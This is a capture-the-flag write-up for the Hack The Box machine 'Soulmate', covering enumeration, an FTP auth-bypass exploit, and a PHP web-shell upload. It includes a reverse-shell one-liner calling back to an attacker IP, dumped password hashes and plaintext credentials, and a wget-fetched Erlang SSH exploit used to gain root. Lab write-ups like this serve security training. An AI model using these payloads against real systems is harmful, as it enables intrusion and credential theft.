---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - CVE-2025-31161
  - CVE-2025-32433-Erlang-OTP-SSH-RCE
---
# Overview

| Name        | Soulmate  |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV -A 10.10.11.86
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 01:20 +0545
Nmap scan report for 10.10.11.86
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   317.67 ms 10.10.14.1
2   317.76 ms 10.10.11.86
```

Register and Login.

Normal file upload vulnerabilities doesn't seem to work.
# Enumeration
## Dirsearch

```bash
❯ dirsearch -u http://soulmate.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/at0m/reports/http_soulmate.htb/_25-09-07_01-22-08.txt

Target: http://soulmate.htb/

[01:22:08] Starting:
[01:23:10] 301 -  178B  - /assets  ->  http://soulmate.htb/assets/
[01:23:10] 403 -  564B  - /assets/
[01:23:30] 302 -    0B  - /dashboard.php  ->  /login
[01:24:00] 200 -    8KB - /login.php
[01:24:01] 302 -    0B  - /logout.php  ->  login.php
[01:24:29] 302 -    0B  - /profile.php  ->  /login
[01:24:34] 200 -   11KB - /register.php

Task Completed
```
## Ffuf

```bash
❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.86/ -H "Host: FUZZ.soulmate.htb" -fs 154

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 335ms]
```
# Exploitation

Go to `ftp.soulmate.htb` and use this [exploit](https://github.com/ibrahmsql/CVE-2025-31161/blob/main/CVE-2025-31161.py).
## CVE-2025-31161 Auth Bypass

```bash
❯ python3 CVE-2025-31161.py --target ftp.soulmate.htb --exploit --new-user admin --password admin --port 80

[36m
  / ____/______  _______/ /_  / ____/ /_____
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/
                                    /_/
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user admin on ftp.soulmate.htb
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb

Summary:
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1
```

Now, Login.

![[soulmate.png]]

```
❯ cat shell.php.png
<?php system($_GET['cmd']); ?>
```

Upload it in `soulmate.htb`.

![[soulmate3.png]]

![[soulmate2.png]]

Rename it to `shell.php` and Save it. Then go to `http://soulmate.htb/assets/images/profiles/shell.php?cmd=id`.

For reverse shell use this payload but encoded `php -r '$sock=fsockopen("10.10.14.233",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
`
`php%20-r%20'%24sock%3Dfsockopen(%2210.10.14.233%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B'
`

```
GET /assets/images/profiles/shell.php?cmd=php%20-r%20'%24sock%3Dfsockopen(%2210.10.14.233%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B' HTTP/1.1
Host: soulmate.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=6fe5p3lkrpljdieon2bqo98cgq
Upgrade-Insecure-Requests: 1

```

```bash
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.233] from (UNKNOWN) [10.10.11.86] 50944
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@soulmate:~/soulmate.htb/public/assets/images/profiles$ ls
ls
c3_1757229536.png  3_1757229673.png   4_1757229490.png  shell.php
3_1757229591.png  4_1757229230.jpeg  5_1757230620.png
3_1757229596.png  4_1757229429.jpeg  aa_1757229935.jpg
www-data@soulmate:~/soulmate.htb/public/assets/images/profiles$ d /
cd /
www-data@soulmate:/$ ls
ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
www-data@soulmate:/$ cd home
cd home
lswww-data@soulmate:/home$
ls
cben
www-data@soulmate:/home$ d ben
cd ben
bash: cd: ben: Permission denied
www-data@soulmate:/home$ ls
ls
ben
www-data@soulmate:/home$ ls -la ben
ls -la ben
ls: cannot open directory 'ben': Permission denied
www-data@soulmate:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 Sep  2 10:27 .
drwxr-xr-x 18 root root 4096 Sep  2 10:27 ..
drwxr-x---  3 ben  ben  4096 Sep  2 10:27 ben
```

```bash
www-data@soulmate:/$ cd /var/www
cd /var/www
www-data@soulmate:~$ ls
ls
html  soulmate.htb
www-data@soulmate:~$ cd soulmate.htb
cd soulmate.htb
www-data@soulmate:~/soulmate.htb$ ls
ls
config  data  public  src
www-data@soulmate:~/soulmate.htb$ cd config
cd config
www-data@soulmate:~/soulmate.htb/config$ cat config.php
cat config.php
<?php
class Database {
    private $db_file = '../data/soulmate.db';
    private $pdo;

    public function __construct() {
        $this->connect();
        $this->createTables();
    }

    private function connect() {
        try {
            // Create data directory if it doesn't exist
            $dataDir = dirname($this->db_file);
            if (!is_dir($dataDir)) {
                mkdir($dataDir, 0755, true);
            }

            $this->pdo = new PDO('sqlite:' . $this->db_file);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            die("Connection failed: " . $e->getMessage());
        }
    }

    private function createTables() {
        $sql = "
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )";

        $this->pdo->exec($sql);

        // Create default admin user if not exists
        $adminCheck = $this->pdo->prepare("SELECT COUNT(*) FROM users WHERE username = ?");
        $adminCheck->execute(['admin']);

        if ($adminCheck->fetchColumn() == 0) {
            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
            $adminInsert = $this->pdo->prepare("
                INSERT INTO users (username, password, is_admin, name)
                VALUES (?, ?, 1, 'Administrator')
            ");
            $adminInsert->execute(['admin', $adminPassword]);
        }
    }

    public function getConnection() {
        return $this->pdo;
    }
}

// Helper functions
function redirect($path) {
    header("Location: $path");
    exit();
}

function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function isAdmin() {
    return isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1;
}

function requireLogin() {
    if (!isLoggedIn()) {
        redirect('/login');
    }
}

function requireAdmin() {
    requireLogin();
    if (!isAdmin()) {
        redirect('/profile');
    }
}
?>
www-data@soulmate:~/soulmate.htb/config$ cd ../data
cd ../data
www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db ".dump"
sqlite3 soulmate.db ".dump"
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
INSERT INTO users VALUES(1,'admin','$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2',1,'Administrator',NULL,NULL,NULL,NULL,'2025-08-10 13:00:08','2025-08-10 12:59:39');
INSERT INTO users VALUES(3,'admin60','$2y$10$DnIxN7MDeJ3PxfgGvEqE/OLYSFrKBCTGKuladu6pGq2xqY.PLh/4i',0,'admin60','hello',NULL,NULL,'','2025-09-07 08:17:55','2025-09-07 08:17:46');
INSERT INTO users VALUES(4,'at0m','$2y$10$7ouvR1hRbku6IN7Kq2G7dOaw0Nwgyh5z9VSNsPfYCxH1mEK7TCEdi',0,'Rijan Poudel','oo','','','4_1757233102.png','2025-09-07 08:18:02','2025-09-07 08:17:53');
INSERT INTO users VALUES(5,'demo','$2y$10$yp8KwcEQx9I7leDy6Z3NveSpWios4wlaHnNqaQJvHIug1zrmeNnjy',0,'demo1 demo2','asdasd','','','5_1757233475.gif','2025-09-07 08:24:16','2025-09-07 08:24:07');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',5);
COMMIT;
```

These are our and other people hashes so not useful and uncrackable.

```bash
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.233] from (UNKNOWN) [10.10.11.86] 39926
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@soulmate:~/soulmate.htb/public/assets/images/profiles$ cd /usr/local/lib
<tb/public/assets/images/profiles$ cd /usr/local/lib
www-data@soulmate:/usr/local/lib$ ls
ls
erlang  erlang_login  python3.10
www-data@soulmate:/usr/local/lib$ cd erlang_login
cd erlang_login
www-data@soulmate:/usr/local/lib/erlang_login$ ls
ls
login.escript  start.escript
www-data@soulmate:/usr/local/lib/erlang_login$ cat start.escript
cat start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
```

Now SSH with ben creds `ben:HouseH0ldings998`

```bash
❯ ssh ben@soulmate.htb
ben@soulmate.htb's password:
Last login: Sun Sep 7 15:58:34 2025 from 10.10.14.233
ben@soulmate:~$ ls
user.txt
ben@soulmate:~$ cat user.txt
dcd96042a937de10ce8fb36f75aa2928
```
# Privilege Escalation

We can see internal ports.

```bash
ben@soulmate:~$ netstat -tunl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:42785         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:45509         0.0.0.0:*               LISTEN
tcp6       0      0 :::4369                 :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
udp        0      0 127.0.0.53:53           0.0.0.0:*
```
## CVE-2025-32433 - Erlang/OTP SSH RCE

Use [this](https://github.com/dollarboysushil/CVE-2025-32433-Erlang-OTP-SSH-Unauthenticated-RCE) erlang exploit.

```bash
❯ ls
CVE-2025-32433-dbs.py  images  README.md

❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.86 - - [07/Sep/2025 23:58:27] "GET /CVE-2025-32433-dbs.py HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

```
ben@soulmate:~$ wget http://10.10.14.233:8000/CVE-2025-32433-dbs.py
--2025-09-07 18:12:51--  http://10.10.14.233:8000/CVE-2025-32433-dbs.py
Connecting to 10.10.14.233:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2415 (2.4K) [text/x-python]
Saving to: ‘CVE-2025-32433-dbs.py’

CVE-2025-32433-dbs.py          100%[===================================================>]   2.36K  --.-KB/s    in 0s

2025-09-07 18:12:51 (149 MB/s) - ‘CVE-2025-32433-dbs.py’ saved [2415/2415]

ben@soulmate:~$ python3 CVE-2025-32433-dbs.py --rhost 127.0.0.1 --rport 2222 --lhost 10.10.14.233 --lport 1234
==================================================
CVE-2025-32433 dollarboysushil's version
==================================================
[*] Reverse shell payload sent to 127.0.0.1:2222
[*] Check your listener on 10.10.14.233:1234
ben@soulmate:~$
```

```bash
❯ nc -nlvp 1234
listening on [any] 1234 ...

connect to [10.10.14.233] from (UNKNOWN) [10.10.11.86] 38008
bash: cannot set terminal process group (3233): Inappropriate ioctl for device
bash: no job control in this shell
root@soulmate:/#
root@soulmate:/# cat /root/root.txt
cat /root/root.txt
2b68ff98cd27d99aed0fddcd8ae58b7c
root@soulmate:/#
```

---
